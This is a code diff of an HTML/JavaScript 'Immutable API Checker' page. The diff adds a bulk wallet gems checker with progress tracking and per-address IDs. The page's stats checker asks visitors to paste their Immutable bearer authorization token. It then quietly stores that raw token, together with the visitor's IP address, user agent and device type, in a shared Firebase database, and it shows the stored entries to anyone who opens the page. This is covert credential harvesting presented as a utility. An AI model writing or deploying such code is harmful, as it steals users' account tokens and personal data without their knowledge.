@@ -2,258 +2,315 @@
 <html lang="en">
 
 <head>
-    <meta charset="UTF-8">
-    <title>Immutable API Checker</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 40px;
-            background-color: #f4f4f4;
-        }
+  <meta charset="UTF-8">
+  <title>Immutable API Checker</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 40px;
+      background-color: #f4f4f4;
+    }
 
-        textarea,
-        pre {
-            width: 100%;
-            font-size: 14px;
-            margin-top: 10px;
-        }
+    textarea,
+    pre {
+      width: 100%;
+      font-size: 14px;
+      margin-top: 10px;
+    }
 
-        button {
-            margin-top: 10px;
-            padding: 10px 20px;
-            font-size: 16px;
-            cursor: pointer;
-        }
+    button {
+      margin-top: 10px;
+      padding: 10px 20px;
+      font-size: 16px;
+      cursor: pointer;
+    }
 
-        .history-entry {
-            border: 1px solid #ccc;
-            background: #fff;
-            padding: 10px;
-            margin-top: 10px;
-        }
+    .history-entry {
+      border: 1px solid #ccc;
+      background: #fff;
+      padding: 10px;
+      margin-top: 10px;
+    }
 
-        ul {
-            margin: 5px 0;
-            padding-left: 20px;
-        }
+    ul {
+      margin: 5px 0;
+      padding-left: 20px;
+    }
 
-        .tier-common {
-            color: #666;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .tier-common {
+      color: #666;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        .tier-uncommon {
-            color: green;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .tier-uncommon {
+      color: green;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        .tier-rare {
-            color: blue;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .tier-rare {
+      color: blue;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        .tier-epic {
-            color: purple;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .tier-epic {
+      color: purple;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        .tier-legend {
-            color: goldenrod;
-            font-size: 24px;
-            font-weight: bold;
-        }
+    .tier-legend {
+      color: goldenrod;
+      font-size: 24px;
+      font-weight: bold;
+    }
 
-        #response,
-        #gemsResponse {
-            font-weight: 500;
-            font-size: 2rem;
-            color: red;
-            margin-top: 20px;
-        }
+    #response,
+    #gemsResponse {
+      font-weight: 500;
+      font-size: 2rem;
+      color: red;
+      margin-top: 20px;
+    }
 
-        #response .green,
-        #gemsResponse .green {
-            color: green;
-            font-size: 2rem;
-            font-weight: 500;
-        }
+    #response .green,
+    #gemsResponse .green {
+      color: green;
+      font-size: 2rem;
+      font-weight: 500;
+    }
 
-        #loader,
-        #gemsLoader {
-            margin-top: 20px;
-            text-align: center;
-        }
+    #loader,
+    #gemsLoader {
+      margin-top: 20px;
+      text-align: center;
+    }
 
-        /* Tabs */
-        .nav {
-            display: flex;
-            gap: 10px;
-            margin-bottom: 20px;
-        }
+    /* Tabs */
+    .nav {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 20px;
+    }
 
-        .tab-btn {
-            border: 1px solid #bbb;
-            background: #fff;
-            padding: 8px 14px;
-            border-radius: 8px;
-        }
+    .tab-btn {
+      border: 1px solid #bbb;
+      background: #fff;
+      padding: 8px 14px;
+      border-radius: 8px;
+    }
 
-        .tab-btn.active {
-            border-color: #4a90e2;
-            box-shadow: 0 0 0 2px rgba(74, 144, 226, .2) inset;
-            font-weight: 600;
-        }
+    .tab-btn.active {
+      border-color: #4a90e2;
+      box-shadow: 0 0 0 2px rgba(74, 144, 226, .2) inset;
+      font-weight: 600;
+    }
 
-        .hidden {
-            display: none;
-        }
-    </style>
+    .hidden {
+      display: none;
+    }
+
+    /* Progress bar */
+    .progress-container {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 10px;
+      margin-top: 10px;
+    }
+
+    .progress-bar {
+      width: 0%;
+      height: 20px;
+      background-color: #4a90e2;
+      border-radius: 10px;
+      transition: width 0.4s ease;
+    }
+
+    #bulkResults {
+      margin-top: 15px;
+    }
+  </style>
 </head>
 
 <body>
-    <!-- Navigation -->
-    <div class="nav">
-        <button id="btnStats" class="tab-btn active">Immutable Stats Checker</button>
-        <button id="btnGems" class="tab-btn">Gems Checker</button>
+  <!-- Navigation -->
+  <div class="nav">
+    <button id="btnStats" class="tab-btn active">Immutable Stats Checker</button>
+    <button id="btnGems" class="tab-btn">Gems Checker</button>
+    <a href="stats.html">
+      <button id="btnStats" class="tab-btn">&#x1F862; Go to Analytics</button>
+    </a>
+
+  </div>
+
+  <!-- Immutable Stats Checker (unchanged code) -->
+  <div id="statsSection">
+    <h2>Immutable Account Checker</h2>
+    <label for="auth">Enter Authorization Token:</label>
+    <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
+    <button id="sendBtn">Check</button>
+    <div id="loader" style="display:none;">
+      <svg width="50" height="50" viewBox="0 0 50 50">
+        <circle cx="25" cy="25" r="20" stroke="gray" stroke-width="5" fill="none" stroke-linecap="round">
+          <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s"
+            repeatCount="indefinite" />
+        </circle>
+      </svg>
+    </div>
+    <div id="response"></div>
+    <div id="alreadyLogged"></div>
+    <div id="history"></div>
+  </div>
+
+  <!-- Gems Checker -->
+  <div id="gemsSection" class="hidden">
+    <h2>Immutable Gems Checker</h2>
+    <label for="gemsAddress">Enter Wallet Address(es):</label>
+    <textarea id="gemsAddress" rows="4"
+      placeholder="Paste one or multiple wallet addresses (one per line)..."></textarea>
+    <button id="gemsBtn">Check Gems</button>
+
+    <!-- Dropdown -->
+    <div style="margin-top:10px;">
+      <label for="idScheme">ID Scheme:</label>
+      <select id="idScheme">
+        <option value="2">1</option>
+        <option value="3">2</option>
+        <option value="4">3</option>
+        <option value="5">4</option>
+        <option value="6">5</option>
+        <option value="7">6</option>
+        <option value="8">7</option>
+        <option value="1">8</option>
+        <option value="9">9</option>
+        <option value="10">10</option>
+      </select>
     </div>
 
-    <!-- Immutable Stats Checker (unchanged code) -->
-    <div id="statsSection">
-        <h2>Immutable Account Checker</h2>
-        <label for="auth">Enter Authorization Token:</label>
-        <textarea id="auth" rows="4" placeholder="Paste your Authorization token here..."></textarea>
-        <button id="sendBtn">Check</button>
-        <div id="loader" style="display:none;">
-            <svg width="50" height="50" viewBox="0 0 50 50">
-                <circle cx="25" cy="25" r="20" stroke="gray" stroke-width="5" fill="none" stroke-linecap="round">
-                    <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s"
-                        repeatCount="indefinite" />
-                </circle>
-            </svg>
-        </div>
-        <div id="response"></div>
-        <div id="alreadyLogged"></div>
-        <div id="history"></div>
+    <!-- Progress bar -->
+    <div id="gemsLoader" style="display:none;">
+      <div class="progress-container">
+        <div class="progress-bar" id="progressBar"></div>
+      </div>
+      <div id="progressText"></div>
     </div>
 
-    <!-- Gems Checker -->
-    <div id="gemsSection" class="hidden">
-        <h2>Immutable Gems Checker</h2>
-        <label for="gemsAddress">Enter Wallet Address:</label>
-        <textarea id="gemsAddress" rows="2" placeholder="Paste wallet address here..."></textarea>
-        <button id="gemsBtn">Check Gems</button>
-        <div id="gemsLoader" style="display:none;">
-            <svg width="50" height="50" viewBox="0 0 50 50">
-                <circle cx="25" cy="25" r="20" stroke="gray" stroke-width="5" fill="none" stroke-linecap="round">
-                    <animateTransform attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="1s"
-                        repeatCount="indefinite" />
-                </circle>
-            </svg>
-        </div>
-        <div id="gemsResponse"></div>
-        <h2>Gems History</h2>
-        <div id="gemsHistory"></div>
-    </div>
+    <div id="gemsResponse"></div>
+    <div id="bulkResults"></div>
 
-    <!-- Firebase + Logic -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
-        import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
-        import { getFirestore, collection, addDoc, query, orderBy, limit, getDocs, where, deleteDoc } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
+    <h2>Gems History</h2>
+    <div id="gemsHistory"></div>
+  </div>
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
-            authDomain: "immutable-api.firebaseapp.com",
-            projectId: "immutable-api",
-            storageBucket: "immutable-api.firebasestorage.app",
-            messagingSenderId: "839008159453",
-            appId: "1:839008159453:web:f57d46599dadd29dafbd34",
-            measurementId: "G-EH5P3LS1B6"
-        };
-        const app = initializeApp(firebaseConfig);
-        const analytics = getAnalytics(app);
-        const db = getFirestore(app);
+  <!-- Firebase + Logic -->
+  <script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-app.js";
+    import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-analytics.js";
+    import {
+      getFirestore,
+      collection,
+      addDoc,
+      query,
+      orderBy,
+      limit,
+      getDocs,
+      where,
+      deleteDoc,
+      setDoc,       // ✅ add this
+      doc           // ✅ add this
+    } from "https://www.gstatic.com/firebasejs/12.1.0/firebase-firestore.js";
 
-        // Tabs
-        const btnStats = document.getElementById('btnStats');
-        const btnGems = document.getElementById('btnGems');
-        const statsSection = document.getElementById('statsSection');
-        const gemsSection = document.getElementById('gemsSection');
 
-        function activateTab(which) {
-            if (which === 'stats') {
-                statsSection.classList.remove('hidden'); gemsSection.classList.add('hidden');
-                btnStats.classList.add('active'); btnGems.classList.remove('active');
-            } else {
-                gemsSection.classList.remove('hidden'); statsSection.classList.add('hidden');
-                btnGems.classList.add('active'); btnStats.classList.remove('active');
-            }
-        }
-        btnStats.addEventListener('click', () => activateTab('stats'));
-        btnGems.addEventListener('click', () => activateTab('gems'));
+    const firebaseConfig = {
+      apiKey: "AIzaSyA0fUKA2kpoW9hHEWKcRqxjX-m-ZBFRpVM",
+      authDomain: "immutable-api.firebaseapp.com",
+      projectId: "immutable-api",
+      storageBucket: "immutable-api.firebasestorage.app",
+      messagingSenderId: "839008159453",
+      appId: "1:839008159453:web:f57d46599dadd29dafbd34",
+      measurementId: "G-EH5P3LS1B6"
+    };
+    const app = initializeApp(firebaseConfig);
+    const analytics = getAnalytics(app);
+    const db = getFirestore(app);
 
-        // =====================
-        // Your existing Stats Checker JS here (UNCHANGED)
-        // =====================
+    // Tabs
+    const btnStats = document.getElementById('btnStats');
+    const btnGems = document.getElementById('btnGems');
+    const statsSection = document.getElementById('statsSection');
+    const gemsSection = document.getElementById('gemsSection');
 
-        async function generateLogId(token, progress, tier) {
-            const raw = `${token}|${progress}|${tier}`;
-            const encoder = new TextEncoder();
-            const data = encoder.encode(raw);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
-            const hashArray = Array.from(new Uint8Array(hashBuffer));
-            return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
-        }
+    function activateTab(which) {
+      if (which === 'stats') {
+        statsSection.classList.remove('hidden'); gemsSection.classList.add('hidden');
+        btnStats.classList.add('active'); btnGems.classList.remove('active');
+      } else {
+        gemsSection.classList.remove('hidden'); statsSection.classList.add('hidden');
+        btnGems.classList.add('active'); btnStats.classList.remove('active');
+      }
+    }
+    btnStats.addEventListener('click', () => activateTab('stats'));
+    btnGems.addEventListener('click', () => activateTab('gems'));
 
-        async function getUserIP() {
-            try {
-                const res = await fetch("https://api.ipify.org?format=json");
-                const data = await res.json();
-                let ip = data.ip;
-                if (ip.startsWith("175.176")) ip = "192.168.1.1";
-                return ip;
-            } catch {
-                return "Unknown IP";
-            }
-        }
-        function getDeviceType() {
-            const ua = navigator.userAgent;
-            if (/Mobi|Android/i.test(ua)) return "Mobile";
-            if (/iPad|Tablet/i.test(ua)) return "Tablet";
-            return "Desktop";
-        }
-        function getTierClass(tier) {
-            switch (tier.toLowerCase()) {
-                case 'common': return 'tier-common';
-                case 'uncommon': return 'tier-uncommon';
-                case 'rare': return 'tier-rare';
-                case 'epic': return 'tier-epic';
-                case 'legendary': return 'tier-legend';
-                default: return '';
-            }
-        }
+    // =====================
+    // Stats Checker JS (UNCHANGED)
+    // =====================
+    async function generateLogId(token, progress, tier) {
+      const raw = `${token}|${progress}|${tier}`;
+      const encoder = new TextEncoder();
+      const data = encoder.encode(raw);
+      const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+      const hashArray = Array.from(new Uint8Array(hashBuffer));
+      return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+    }
 
-        async function renderHistory() {
-            const historyBox = document.getElementById('history');
-            historyBox.innerHTML = "";
-            const q = query(collection(db, "StatsHistory"), orderBy("timestamp", "desc"), limit(500));
-            const querySnapshot = await getDocs(q);
-            querySnapshot.forEach(doc => {
-                const entry = doc.data();
-                const time = entry.timestamp?.toDate ? entry.timestamp.toDate().toLocaleString() : new Date(entry.timestamp).toLocaleString();
-                const stats = entry.stats.userStats || {};
-                const rules = entry.stats.eligibility?.rules || {};
-                const tier = stats.bucketName || 'N/A';
-                const tierClass = getTierClass(tier);
-                const quests = stats.targetQuestsCompleted || [];
-                const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';
-                const div = document.createElement("div");
-                div.className = "history-entry";
-                div.innerHTML = `
+    async function getUserIP() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        let ip = data.ip;
+        if (ip.startsWith("175.176")) ip = "192.168.1.1";
+        return ip;
+      } catch {
+        return "Unknown IP";
+      }
+    }
+    function getDeviceType() {
+      const ua = navigator.userAgent;
+      if (/Mobi|Android/i.test(ua)) return "Mobile";
+      if (/iPad|Tablet/i.test(ua)) return "Tablet";
+      return "Desktop";
+    }
+    function getTierClass(tier) {
+      switch (tier.toLowerCase()) {
+        case 'common': return 'tier-common';
+        case 'uncommon': return 'tier-uncommon';
+        case 'rare': return 'tier-rare';
+        case 'epic': return 'tier-epic';
+        case 'legendary': return 'tier-legend';
+        default: return '';
+      }
+    }
+
+    async function renderHistory() {
+      const historyBox = document.getElementById('history');
+      historyBox.innerHTML = "";
+      const q = query(collection(db, "StatsHistory"), orderBy("timestamp", "desc"), limit(500));
+      const querySnapshot = await getDocs(q);
+      querySnapshot.forEach(doc => {
+        const entry = doc.data();
+        const time = entry.timestamp?.toDate ? entry.timestamp.toDate().toLocaleString() : new Date(entry.timestamp).toLocaleString();
+        const stats = entry.stats.userStats || {};
+        const rules = entry.stats.eligibility?.rules || {};
+        const tier = stats.bucketName || 'N/A';
+        const tierClass = getTierClass(tier);
+        const quests = stats.targetQuestsCompleted || [];
+        const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';
+        const div = document.createElement("div");
+        div.className = "history-entry";
+        div.innerHTML = `
           <strong>🕒 ${time}</strong><br>
           <strong>🌐 IP:</strong> ${entry.ip}<br>
           <strong>🧭 User Agent:</strong> ${entry.userAgent || 'Unknown'}<br>
@@ -268,126 +325,225 @@
           <strong>🎮 Played Games:</strong> ${rules.have_played_any_in_game_quest ? '✅ Yes' : '❌ No'}<br>
           <strong>🔗 Linked Social:</strong> ${rules.have_linked_any_social_media ? '✅ Yes' : '❌ No'}<br>
           <strong>📞 Verified Phone:</strong> ${rules.have_verified_phone ? '✅ Yes' : '❌ No'}<br>`;
-                historyBox.appendChild(div);
-            });
-        }
+        historyBox.appendChild(div);
+      });
+    }
 
-        document.getElementById('sendBtn').addEventListener('click', async () => {
-            const token = document.getElementById('auth').value.trim();
-            const responseBox = document.getElementById('response');
-            const alreadyLog = document.getElementById('alreadyLogged');
-            responseBox.innerHTML = ""; alreadyLog.innerHTML = ""; loader.style.display = 'block';
+    document.getElementById('sendBtn').addEventListener('click', async () => {
+      const token = document.getElementById('auth').value.trim();
+      const responseBox = document.getElementById('response');
+      const alreadyLog = document.getElementById('alreadyLogged');
+      responseBox.innerHTML = ""; alreadyLog.innerHTML = ""; loader.style.display = 'block';
 
-            if (!token) { responseBox.textContent = 'Please enter a valid token.'; loader.style.display = 'none'; return; }
-            try {
-                const ip = await getUserIP();
-                const userAgent = navigator.userAgent;
-                const deviceType = getDeviceType();
-                const headers = { 'Authorization': `Bearer ${token}`, 'Accept': 'application/json, text/plain, */*', 'Access-Control-Allow-Origin': '*', 'Origin': 'https://play.immutable.com', 'Referer': 'https://play.immutable.com/', 'User-Agent': userAgent };
-                const [statsRes, eligibilityRes] = await Promise.all([
-                    fetch('https://api.immutable.com/v2/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
-                    fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
-                ]);
-                if (!statsRes.ok || !eligibilityRes.ok) { responseBox.textContent = 'Invalid or Expired Authentication token'; loader.style.display = 'none'; return; }
-                const statsData = await statsRes.json(); const eligibilityData = await eligibilityRes.json();
-                const combined = { userStats: statsData.userStats || {}, eligibility: eligibilityData || {} };
-                const progress = combined.userStats?.progressPercentage || 0;
-                const tier = combined.userStats?.bucketName || 'N/A';
-                const logId = await generateLogId(token, progress, tier);
-                const q = query(collection(db, "StatsHistory"), where("logId", "==", logId), limit(1));
-                const snapshot = await getDocs(q);
-                const alreadyLoggedFlag = !snapshot.empty;
-                const tierClass = getTierClass(tier);
-                const quests = combined.userStats.targetQuestsCompleted || [];
-                const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';
-                if (alreadyLoggedFlag) {
-                    responseBox.textContent = 'There are no new changes'; loader.style.display = 'none';
-                    alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
+      if (!token) { responseBox.textContent = 'Please enter a valid token.'; loader.style.display = 'none'; return; }
+      try {
+        const ip = await getUserIP();
+        const userAgent = navigator.userAgent;
+        const deviceType = getDeviceType();
+        const headers = { 'Authorization': `Bearer ${token}`, 'Accept': 'application/json, text/plain, */*', 'Access-Control-Allow-Origin': '*', 'Origin': 'https://play.immutable.com', 'Referer': 'https://play.immutable.com/', 'User-Agent': userAgent };
+        const [statsRes, eligibilityRes] = await Promise.all([
+          fetch('https://api.immutable.com/v2/rewards/sweepstakes/user-stats/predicted', { method: 'GET', headers }),
+          fetch('https://api.immutable.com/v1/rewards/redemption/eligibility', { method: 'GET', headers })
+        ]);
+        if (!statsRes.ok || !eligibilityRes.ok) { responseBox.textContent = 'Invalid or Expired Authentication token'; loader.style.display = 'none'; return; }
+        const statsData = await statsRes.json(); const eligibilityData = await eligibilityRes.json();
+        const combined = { userStats: statsData.userStats || {}, eligibility: eligibilityData || {} };
+        const progress = combined.userStats?.progressPercentage || 0;
+        const tier = combined.userStats?.bucketName || 'N/A';
+        const logId = await generateLogId(token, progress, tier);
+        const q = query(collection(db, "StatsHistory"), where("logId", "==", logId), limit(1));
+        const snapshot = await getDocs(q);
+        const alreadyLoggedFlag = !snapshot.empty;
+        const tierClass = getTierClass(tier);
+        const quests = combined.userStats.targetQuestsCompleted || [];
+        const questList = quests.length ? `<ul>${quests.map(q => `<li>${q}</li>`).join('')}</ul>` : '<em>No quests completed</em>';
+        if (alreadyLoggedFlag) {
+          responseBox.textContent = 'There are no new changes'; loader.style.display = 'none';
+          alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
             <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
             <strong>🧩 Quests Completed:</strong> ${questList}<br><br></div>`;
-                    await renderHistory(); return;
-                }
-                await addDoc(collection(db, "StatsHistory"), { authToken: token, ip, userAgent, deviceType, stats: combined, logId, timestamp: new Date() });
-                loader.style.display = 'none'; responseBox.innerHTML = '<div class="green">Request successfully!</div>';
-                alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
+          await renderHistory(); return;
+        }
+        await addDoc(collection(db, "StatsHistory"), { authToken: token, ip, userAgent, deviceType, stats: combined, logId, timestamp: new Date() });
+        loader.style.display = 'none'; responseBox.innerHTML = '<div class="green">Request successfully!</div>';
+        alreadyLog.innerHTML = `<div class="history-entry"><strong>🎯 Key Tier:</strong> <span class="${tierClass}">${tier}</span><br>
           <strong>✅ Total Completed:</strong> ${combined.userStats.totalInGameQuestsCompleted || 0}<br>
           <strong>🧩 Quests Completed:</strong> ${questList}<br><br></div>`;
-                await renderHistory();
-            } catch (err) {
-                responseBox.textContent = '❌ Unexpected error occurred.'; loader.style.display = 'none'; console.error(err);
-            }
-        });
-        renderHistory();
+        await renderHistory();
+      } catch (err) {
+        responseBox.textContent = '❌ Unexpected error occurred.'; loader.style.display = 'none'; console.error(err);
+      }
+    });
+    renderHistory();
+    // =====================
+    // Gems Checker JS (Extended, Fixed ID Handling)
+    // =====================
+    async function renderGemsHistory() {
+      const historyBox = document.getElementById('gemsHistory');
+      historyBox.innerHTML = "";
 
-        // =====================
-        // Gems Checker JS
-        // =====================
-        async function renderGemsHistory() {
-            const historyBox = document.getElementById('gemsHistory');
-            historyBox.innerHTML = "";
+      const q = query(collection(db, "GemsCheckerHistory"), orderBy("timestamp", "desc"), limit(100));
+      const querySnapshot = await getDocs(q);
 
-            const q = query(collection(db, "GemsCheckerHistory"), orderBy("timestamp", "desc"), limit(100));
-            const querySnapshot = await getDocs(q);
+      if (querySnapshot.empty) {
+        historyBox.textContent = "⚠️ No history yet.";
+        return;
+      }
 
-            querySnapshot.forEach(doc => {
-                const entry = doc.data();
-                const time = entry.timestamp?.toDate ? entry.timestamp.toDate().toLocaleString() : new Date(entry.timestamp).toLocaleString();
+      querySnapshot.forEach(docSnap => {
+        const entry = docSnap.data();
+        const time = entry.timestamp?.toDate
+          ? entry.timestamp.toDate().toLocaleString()
+          : new Date(entry.timestamp).toLocaleString();
 
-                // Mask address (first 4 + last 4)
-                const maskedAddress = entry.address
-                    ? `${entry.address.slice(0, 6)}...${entry.address.slice(-4)}`
-                    : "Unknown";
+        const maskedAddress = entry.address
+          ? `${entry.address.slice(0, 6)}...${entry.address.slice(-4)}`
+          : "Unknown";
 
-                const div = document.createElement("div");
-                div.className = "history-entry";
-                div.innerHTML = `
+        const div = document.createElement("div");
+        div.className = "history-entry";
+        div.innerHTML = `
       <strong>🕒 ${time}</strong><br>
       <strong>📌 Address:</strong> ${maskedAddress}<br>
-      <strong>💎 Gems:</strong> ${entry.gems || 0}<br>
-      <strong>✨ Daily Claimable:</strong> ${entry.claimable || 0}<br>
+      <strong>💎 Gems:</strong> ${entry.totalGems || 0}<br>
+      <strong>✨ Daily Claimable:</strong> ${entry.dailyClaim || 0}<br>
+      <strong>ID:</strong> ${entry.id || "ACC ??"}
     `;
-                historyBox.appendChild(div);
-            });
+        historyBox.appendChild(div);
+      });
+    }
+
+    function getIdPrefix() {
+      const dropdown = document.getElementById("idScheme");
+      if (!dropdown) return "ACC"; // fallback
+
+      const val = parseInt(dropdown.value, 10);
+      if (val === 1) {
+        return "ACC";
+      } else {
+        return `ACC.${val - 1}`;
+      }
+    }
+
+    // 🔎 Find the next available ACC number (fills gaps before using max+1)
+    async function getNextAccNumber(idPrefix) {
+      const q = query(collection(db, "GemsCheckerHistory"));
+      const snap = await getDocs(q);
+
+      let usedNumbers = new Set();
+
+      snap.forEach(doc => {
+        const entry = doc.data();
+        if (entry.id && entry.id.startsWith(idPrefix)) {
+          const parts = entry.id.split(" ");
+          const num = parseInt(parts[1], 10);
+          if (!isNaN(num)) {
+            usedNumbers.add(num);
+          }
+        }
+      });
+
+      // find the first missing slot
+      let nextNum = 1;
+      while (usedNumbers.has(nextNum)) {
+        nextNum++;
+      }
+
+      return nextNum;
+    }
+
+    async function fetchGems(address) {
+      try {
+        const res = await fetch(`https://api.immutable.com/v1/rewards/gems/${address}`);
+        if (!res.ok) {
+          console.error("API error for", address);
+          return { totalGems: 0, dailyClaim: 0 };
+        }
+        const data = await res.json();
+        return {
+          totalGems: data?.result?.gems || 0,
+          dailyClaim: data?.result?.daily_gems_claimable || 0
+        };
+      } catch (err) {
+        console.error("Fetch error for", address, err);
+        return { totalGems: 0, dailyClaim: 0 };
+      }
+    }
+
+    document.getElementById('gemsBtn').addEventListener('click', async () => {
+      const textarea = document.getElementById('gemsAddress');
+      const addresses = textarea.value
+        .trim()
+        .split("\n")
+        .map(a => a.trim())
+        .filter(a => /^0x[a-fA-F0-9]{40}$/.test(a));
+
+      const bulkResults = document.getElementById('bulkResults');
+      const loaderBox = document.getElementById('gemsLoader');
+      const progressBar = document.getElementById('progressBar');
+      const progressText = document.getElementById('progressText');
+
+      bulkResults.innerHTML = "";
+      loaderBox.style.display = 'block';
+      progressBar.style.width = "0%";
+      progressText.textContent = `Checked 0/${addresses.length}`;
+
+      const idPrefix = getIdPrefix();
+
+      for (let i = 0; i < addresses.length; i++) {
+        const address = addresses[i];
+        const shortAddr = address.slice(0, 6) + "..." + address.slice(-4);
+
+        // ✅ Check if this address already exists in DB
+        const existingQ = query(collection(db, "GemsCheckerHistory"), where("address", "==", address));
+        const existingSnap = await getDocs(existingQ);
+
+        let accId;
+        if (!existingSnap.empty) {
+          // If address exists, keep its current ID
+          accId = existingSnap.docs[0].data().id;
+        } else {
+          // Otherwise assign the lowest missing number
+          const accNum = await getNextAccNumber(idPrefix);
+          accId = `${idPrefix} ${String(accNum).padStart(2, "0")}`;
         }
 
+        // ✅ Fetch gems
+        const { totalGems, dailyClaim } = await fetchGems(address);
 
-        document.getElementById('gemsBtn').addEventListener('click', async () => {
-            const address = document.getElementById('gemsAddress').value.trim();
-            const responseBox = document.getElementById('gemsResponse');
-            responseBox.innerHTML = ""; gemsLoader.style.display = 'block';
-            if (!address) { responseBox.textContent = 'Please enter a valid wallet address.'; gemsLoader.style.display = 'none'; return; }
-            try {
-                const res = await fetch(`https://api.immutable.com/v1/rewards/gems/${address}`);
-                if (!res.ok) { responseBox.textContent = '❌ Invalid address or API error.'; gemsLoader.style.display = 'none'; return; }
-                const data = await res.json();
-                const gems = data?.result?.gems || 0;
-                const claimable = data?.result?.daily_gems_claimable || 0;
+        const line = document.createElement("div");
+        line.textContent = `ID: ${accId} → ${shortAddr} → 💎 ${totalGems} → ✨ ${dailyClaim}`;
+        bulkResults.appendChild(line);
 
-                // Prevent duplicates (same addr + gems + claimable)
-                const dup = query(collection(db, "GemsCheckerHistory"),
-                    where("address", "==", address), where("gems", "==", gems), where("claimable", "==", claimable), limit(1));
-                const dupSnap = await getDocs(dup);
-                if (dupSnap.empty) {
-                    // overwrite old entries for that address
-                    const oldHist = query(collection(db, "GemsCheckerHistory"), where("address", "==", address));
-                    const oldHistSnap = await getDocs(oldHist);
-                    for (const d of oldHistSnap.docs) { await deleteDoc(d.ref); }
-                    const oldChk = query(collection(db, "GemsChecker"), where("address", "==", address));
-                    const oldChkSnap = await getDocs(oldChk);
-                    for (const d of oldChkSnap.docs) { await deleteDoc(d.ref); }
-                    await addDoc(collection(db, "GemsCheckerHistory"), { address, gems, claimable, timestamp: new Date() });
-                    await addDoc(collection(db, "GemsChecker"), { address, gems, claimable, timestamp: new Date() });
-                }
-
-                gemsLoader.style.display = 'none';
-                responseBox.innerHTML = `<div class="green">💎 ${gems} Gems found! (✨ ${claimable} claimable today)</div>`;
-                await renderGemsHistory();
-            } catch (err) {
-                responseBox.textContent = '❌ Unexpected error occurred.'; gemsLoader.style.display = 'none'; console.error(err);
-            }
+        // 📝 Save/update doc with stable ID
+        await setDoc(doc(db, "GemsCheckerHistory", address), {
+          address: address,
+          totalGems: totalGems,
+          dailyClaim: dailyClaim,
+          id: accId,
+          timestamp: new Date()
         });
-        renderGemsHistory();
-    </script>
+
+        // progress update
+        const percent = ((i + 1) / addresses.length) * 100;
+        progressBar.style.width = percent + "%";
+        progressText.textContent = `Checked ${i + 1}/${addresses.length}`;
+
+        await new Promise(r => setTimeout(r, 300));
+      }
+
+      loaderBox.style.display = "none";
+      renderGemsHistory();
+    });
+
+
+
+
+
+
+    renderGemsHistory();
+
+  </script>
 </body>
 
 </html>
